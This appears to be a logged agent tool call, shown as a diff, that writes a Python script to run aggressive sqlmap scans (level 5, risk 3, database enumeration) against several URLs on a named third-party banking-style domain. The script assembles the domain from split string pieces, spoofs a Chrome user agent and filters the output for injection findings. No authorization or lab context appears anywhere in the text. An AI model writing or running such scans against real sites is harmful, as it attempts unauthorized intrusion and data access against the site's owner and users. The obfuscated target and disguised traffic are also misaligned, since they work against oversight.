@@ -1,0 +1,35 @@
+# command: cd /work && cp tool_outputs/p2_send.py tool_outputs/p2_sm1.py 2>/dev/null; python3 - <<'PY'
+open("tool_outputs/p2_sm1.py","w").write('''import subprocess
+B = "https://" + "www." + "infinity" + "capital" + ".bh"
+UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
+urls = [
+    B + "/?id=1&search=test&page=2",
+    B + "/?page=2",
+    B + "/contact?cb=1&x=1&q=1",
+    B + "/api?id=1",
+]
+KEYS = ["injection", "payload", "did not find", "doesn", "parameter", "testing on",
+        "redirect", "errors", "heuristic", "not injectable", "is vulnerable"]
+for u in urls:
+    print("#" * 20, "sqlmap ::", u, flush=True)
+    cmd = ["sqlmap", "-u", u, "--batch", "--level=5", "--risk=3", "--dbs",
+           "--threads=4", "--timeout=15", "--retries=1", "-A", UA,
+           "--output-dir=tool_outputs/sqlmap_get", "--flush-session"]
+    p = subprocess.run(cmd, capture_output=True, text=True, timeout=2400)
+    out = p.stdout + p.stderr
+    for line in out.splitlines():
+        low = line.lower()
+        if any(k in low for k in KEYS):
+            print(line[:200])
+    print("rc", p.returncode, flush=True)
+''')
+print("written")
+PY
+ls -la tool_outputs/p2_sm1.py
+# tool: cp
+# exit_code: 0
+# ts: 2026-09-30T11:39:35.486524+00:00
+# ---
+
+written
+-rw-r--r-- 1 kali kali 1026 Sep 30 11:39 tool_outputs/p2_sm1.py
